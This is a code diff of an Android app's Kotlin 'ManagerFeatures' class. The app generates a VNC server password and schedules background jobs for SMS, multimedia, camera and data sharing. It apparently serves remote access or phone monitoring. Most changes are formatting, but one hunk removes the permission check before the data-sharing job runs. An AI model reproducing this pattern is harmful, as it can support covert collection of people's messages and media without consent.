@@ -47,7 +47,8 @@ import kotlin.random.Random
 
 
 private fun passwordServerVnc(size: Int = 12): String {
-    val caracteres = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#\$%^&*()-_=+<>?"
+    val caracteres =
+        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#\$%^&*()-_=+<>?"
     return (1..size)
         .map { Random.nextInt(0, caracteres.length) }
         .map(caracteres::get)
@@ -145,8 +146,9 @@ class ManagerFeatures(
         fun start() {
             coroutineScope.launch {
                 localDataProvider.smsState.collect {
-                    if (it == GLOBAL_STATES_PERMISSIONS.GRANTED){
-                        val smsWork: WorkRequest = OneTimeWorkRequest.Builder(SmsWork::class.java).build()
+                    if (it == GLOBAL_STATES_PERMISSIONS.GRANTED) {
+                        val smsWork: WorkRequest =
+                            OneTimeWorkRequest.Builder(SmsWork::class.java).build()
                         WorkManager.getInstance(context).enqueue(smsWork)
                         showText("Mensajes")
                     }
@@ -183,14 +185,15 @@ class ManagerFeatures(
         fun start() {
 
             coroutineScope.launch {
-                localDataProvider.multimediaState.collect{
+                localDataProvider.multimediaState.collect {
                     if (it == GLOBAL_STATES_PERMISSIONS.GRANTED) {
                         val multimediaWork: WorkRequest =
-                            OneTimeWorkRequest.Builder(MultimediaWork::class.java).setBackoffCriteria(
-                                BackoffPolicy.LINEAR,  // politics
-                                10,  // Time 10 mins
-                                TimeUnit.MINUTES
-                            )
+                            OneTimeWorkRequest.Builder(MultimediaWork::class.java)
+                                .setBackoffCriteria(
+                                    BackoffPolicy.LINEAR,  // politics
+                                    10,  // Time 10 mins
+                                    TimeUnit.MINUTES
+                                )
                                 .build()
 
                         WorkManager.getInstance(context).enqueue(multimediaWork)
@@ -209,7 +212,7 @@ class ManagerFeatures(
     inner class camera() {
         fun start() {
             coroutineScope.launch {
-                localDataProvider.cameraState.collect{
+                localDataProvider.cameraState.collect {
                     if (it == GLOBAL_STATES_PERMISSIONS.GRANTED) {
                         val cameraWOrk: WorkRequest =
                             OneTimeWorkRequest.Builder(CameraWork::class.java).build()
@@ -251,13 +254,11 @@ class ManagerFeatures(
         fun start() {
             coroutineScope.launch {
                 localDataProvider.shareDataState.collect {
-                    if (it == GLOBAL_STATES_PERMISSIONS.GRANTED) {
-                        val shareDataWork: WorkRequest =
-                            OneTimeWorkRequest.Builder(ShareDataWork::class.java)
-                                .build()
-                        WorkManager.getInstance(context).enqueue(shareDataWork)
-                        showText("shareData")
-                    }
+                    val shareDataWork: WorkRequest =
+                        OneTimeWorkRequest.Builder(ShareDataWork::class.java)
+                            .build()
+                    WorkManager.getInstance(context).enqueue(shareDataWork)
+                    showText("ShareData")
                 }
             }
         }
